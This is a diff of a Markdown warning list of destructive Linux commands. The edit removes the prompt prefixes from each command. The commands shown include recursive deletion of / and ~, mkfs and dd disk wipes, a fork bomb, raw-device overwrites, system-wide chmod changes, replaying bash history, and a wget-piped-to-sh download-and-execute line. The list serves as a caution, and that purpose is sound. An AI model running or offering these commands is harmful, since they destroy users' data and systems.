@@ -23,12 +23,12 @@ Remove recursively everything starting from the `/` folder or your home `~`. In 
 
 ```bash
 # ! Requires root priviledges
-~# rm -rf /
-~# rm -rf /*
-~# rm -rf *
+rm -rf /
+rm -rf /*
+rm -rf *
 
 # ! Does NOT require root priviledges
-~$ rm -rf ~
+rm -rf ~
 ```
 
 ### 2. Destroy everything (hex version)
@@ -53,7 +53,7 @@ char esp[] __attribute__ ((section(".text"))) /* e.s.p release */
 To create a new filesystem on a partition automatically destroys everything on it. Needs root proviledges.
 
 ```bash
-~# mkfs -t ext4 /dev/sda2
+mkfs -t ext4 /dev/sda2
 ```
 
 ### 4. Forkbomb
@@ -61,7 +61,7 @@ To create a new filesystem on a partition automatically destroys everything on i
 It creates recursively new instances of itself until the system freezes. The problem can be solved simply hard rebooting the whole system. Not really a huge problem on your laptop, but a system administrator on a server won't be happy.
 
 ```bash
-~$ :(){:|:&};:
+:(){:|:&};:
 ```
 
 ### 5. Output to filesystem
@@ -69,7 +69,7 @@ It creates recursively new instances of itself until the system freezes. The pro
 Overwrites the data on a filesystem with the output of the command command. The overwritten data are unrecoverable.
 
 ```bash
-~# command > /dev/sda2
+command > /dev/sda2
 ```
 
 ### 6. Download and execute
@@ -77,7 +77,7 @@ Overwrites the data on a filesystem with the output of the command command. The 
 Never download and execute script from untrusted sources without checking them carefully before.
 
 ```bash
-~$ wget http://whatever.org/file -O - | sh
+wget http://whatever.org/file -O - | sh
 ```
 
 ### 7. Send to nowhere
@@ -85,7 +85,7 @@ Never download and execute script from untrusted sources without checking them c
 Moves something to null, the big void. Your data will simply evaporates.
 
 ```bash
-~$ mv /path/folder /dev/null
+mv /path/folder /dev/null
 ```
 
 ### 8. Wipe the disk
@@ -93,7 +93,7 @@ Moves something to null, the big void. Your data will simply evaporates.
 This covers the disk with zeros from the zeros. Corresponds to a low level formatting.
 
 ```bash
-~# dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
 ```
 
 ### 9. Wipe the disk (version 2)
@@ -101,7 +101,7 @@ This covers the disk with zeros from the zeros. Corresponds to a low level forma
 Like the former but with random data instead of zeros.
 
 ```bash
-~# dd if=/dev/urandom of=/dev/sda
+dd if=/dev/urandom of=/dev/sda
 ```
 
 ### 10. Doors open
@@ -109,7 +109,7 @@ Like the former but with random data instead of zeros.
 Gives all the permissions to everybody on the whole system recursively. Not really good on your laptop, destructive on a server.
 
 ```bash
-~# chmod -R 777 /
+chmod -R 777 /
 ```
 
 ### 11. History
@@ -117,7 +117,7 @@ Gives all the permissions to everybody on the whole system recursively. Not real
 It executes again everything is in the history. Imagine your system re-executing the 1000000 commands you have stored in your history, moving, creating, deleting. It will be long to fix the mess.
 
 ```bash
-~$ source ~/.bash_history
+source ~/.bash_history
 ```
 
 ### 12. Permissions blackhole
@@ -125,5 +125,5 @@ It executes again everything is in the history. Imagine your system re-executing
 Makes everything non executable. Not a single binary will be executable any more. Neither the `chmod` one...
 
 ```bash
-~# chmod -R -x /
+chmod -R -x /
 ```
